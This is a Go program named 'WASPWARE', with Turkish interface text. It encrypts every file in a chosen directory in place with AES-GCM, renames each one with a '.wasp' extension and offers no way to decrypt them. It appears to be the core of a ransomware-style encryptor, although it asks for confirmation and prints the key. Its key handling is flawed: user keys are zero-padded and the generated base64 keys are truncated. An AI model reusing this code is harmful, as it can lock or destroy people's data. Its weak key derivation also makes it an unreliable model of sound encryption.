package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"os"
	"path/filepath"
)

// Version - Versiyon bilgisi
var Version = "1.0.0"

func generateRandomBase64String(length int) (string, error) {
	randomBytes := make([]byte, length)
	_, err := rand.Read(randomBytes)
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(randomBytes), nil
}

func createKey() string {
	keyLength := 32
	randomBase64String, err := generateRandomBase64String(keyLength)
	if err != nil {
		fmt.Println("Hata: Anahtar oluşturulurken hata oluştu:", err)
		return ""
	}
	return randomBase64String
}

func trimSpace(s string) string {
	if len(s) == 0 {
		return s
	}
	for len(s) > 0 && (s[0] == ' ' || s[0] == '\t' || s[0] == '\n' || s[0] == '\r') {
		s = s[1:]
	}
	for len(s) > 0 && (s[len(s)-1] == ' ' || s[len(s)-1] == '\t' || s[len(s)-1] == '\n' || s[len(s)-1] == '\r') {
		s = s[:len(s)-1]
	}
	return s
}

func askForKey() (string, error) {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Şifreleme anahtarı giriniz: ")
	key, err := reader.ReadString('\n')
	if err != nil {
		return "", err
	}
	return trimSpace(key), nil
}

func askForDirectory() (string, error) {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Şifrelenmesi istenen dizini giriniz: ")
	directory, err := reader.ReadString('\n')
	if err != nil {
		return "", err
	}
	return trimSpace(directory), nil
}

func askForConfirmation(prompt string) (bool, error) {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(prompt)
	input, err := reader.ReadString('\n')
	if err != nil {
		return false, err
	}
	input = trimSpace(input)
	if input == "" {
		return true, nil
	}
	if input == "y" || input == "Y" {
		return true, nil
	}
	if input == "n" || input == "N" {
		return false, nil
	}
	fmt.Println("Geçersiz giriş. Lütfen 'y' veya 'n' giriniz.")
	return askForConfirmation(prompt)
}

func encryptAES(plainText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	encryptedData := gcm.Seal(nonce, nonce, plainText, nil)
	return encryptedData, nil
}

func makeEncrypt(path string, key []byte) error {
	binaryName := filepath.Base(os.Args[0])
	binaryPattern := binaryName + ".wasp"

	err := filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			if filePath == binaryName || filePath == binaryPattern {
				fmt.Printf("  ℹ️  Kendi dosyası atlandı: %s\n", filePath)
				return nil
			}

			content, err := os.ReadFile(filePath)
			if err != nil {
				fmt.Printf("  ⚠️  Dosya okuma hatası (%s): %v\n", filePath, err)
				return nil
			}
			encryptedContent, err := encryptAES(content, key)
			if err != nil {
				fmt.Printf("  ⚠️  Şifreleme hatası (%s): %v\n", filePath, err)
				return nil
			}
			err = os.WriteFile(filePath, encryptedContent, info.Mode())
			if err != nil {
				fmt.Printf("  ⚠️  Dosya yazma hatası (%s): %v\n", filePath, err)
				return err
			}
		}
		return nil
	})
	return err
}

func changeExtensions(path string) error {
	err := filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			newPath := filePath + ".wasp"
			err := os.Rename(filePath, newPath)
			if err != nil {
				fmt.Printf("  ⚠️  Uzantı değiştirme hatası (%s): %v\n", filePath, err)
				return nil
			}
			fmt.Printf("  ✓  %s -> %s\n", filePath, newPath)
		}
		return nil
	})
	return err
}

func repeatChar(c byte, n int) string {
	s := ""
	for i := 0; i < n; i++ {
		s += string(c)
	}
	return s
}

func runEncryption(key string, directory string) {
	fmt.Println("\n" + repeatChar('=', 60))
	fmt.Println("🔐 WASPWARE - Dosya Şifreleme Aracı")
	fmt.Println(repeatChar('=', 60))
	fmt.Printf("\n🔑 Şifreleme anahtarı: %s\n", key)
	fmt.Println(repeatChar('-', 60))

	if directory == "" {
		fmt.Println("❌ Hata: Boş dizin!")
		return
	}

	info, err := os.Stat(directory)
	if err != nil {
		fmt.Printf("❌ Hata: '%s' dizini bulunamadı!\n", directory)
		return
	}

	if !info.IsDir() {
		fmt.Println("❌ Hata: Belirtilen bir dosya değil, bir dizin olmalı!")
		return
	}

	keyBytes := make([]byte, 32)
	copy(keyBytes, []byte(key))
	for i := len(key); i < 32; i++ {
		keyBytes[i] = 0
	}

	fmt.Printf("\n🚀 '%s' dizinindeki dosyalar şifreleniyor...\n\n", directory)

	err = makeEncrypt(directory, keyBytes)
	if err != nil {
		fmt.Printf("❌ Şifreleme sırasında hata: %v\n", err)
		return
	}

	fmt.Println("\n🔄 Dosya uzantıları değiştiriliyor...")
	err = changeExtensions(directory)
	if err != nil {
		fmt.Printf("⚠️  Uzantı değiştirme sırasında bazı hatalar: %v\n", err)
	}

	fmt.Println("\n" + repeatChar('=', 60))
	fmt.Println("✅ ŞİFRELEME TAMAMLANDI!")
	fmt.Println(repeatChar('=', 60))
	fmt.Printf("\n📁 Şifrelenmiş dosyalar: %s/\n", directory)
	fmt.Println("💾 Dosyalar AES-256-GCM ile şifrelenmiştir.")
	fmt.Println("🔑 Anahtarı güvenli bir yerde saklayınız!")
	fmt.Println("\n💡 Terminal açık kalıyor. Ctrl+C ile çıkış yapabilirsiniz.")
	fmt.Println(repeatChar('=', 60))
}

func main() {
	keyPtr := flag.String("key", "", "Şifreleme anahtarı (opsiyonel)")
	dizinPtr := flag.String("dizin", "", "Hedef dizin (opsiyonel)")

	flag.Parse()

	if *keyPtr != "" && *dizinPtr != "" {
		fmt.Printf("🔑 Komut satırı anahtarı kullanılıyor: %s\n", *keyPtr)
		runEncryption(*keyPtr, *dizinPtr)
		return
	}

	fmt.Println("\n" + repeatChar('=', 60))
	fmt.Println("🔐 WASPWARE - Dosya Şifreleme Aracı")
	fmt.Println(repeatChar('=', 60))
	fmt.Println("\n📝 AES-256-GCM şifreleme kullanır.")
	fmt.Println("📝 Tüm dosyalar .wasp uzantısına dönüştürülecektir.\n")

	fmt.Print("🔑 Şifreleme anahtarı (boş=random): ")
	userKey, _ := askForKey()

	if userKey == "" {
		fmt.Println("\n⚙️  Random key üretiliyor...")
		randomKey := createKey()
		userKey = randomKey
		fmt.Printf("🔑 Anahtar: %s\n", randomKey)
	} else {
		fmt.Printf("🔑 Anahtar: %s\n", userKey)
	}

	fmt.Print("⚠️  Onaylıyor musunuz? (y/n): ")
	confirmed, _ := askForConfirmation("Onaylıyor musunuz? ")

	if !confirmed {
		fmt.Println("\n❌ İşlem iptal edildi.")
		return
	}

	fmt.Print("📁 Hedef dizin: ")
	directory, _ := askForDirectory()

	if directory == "" {
		directory = "."
	}

	runEncryption(userKey, directory)
}
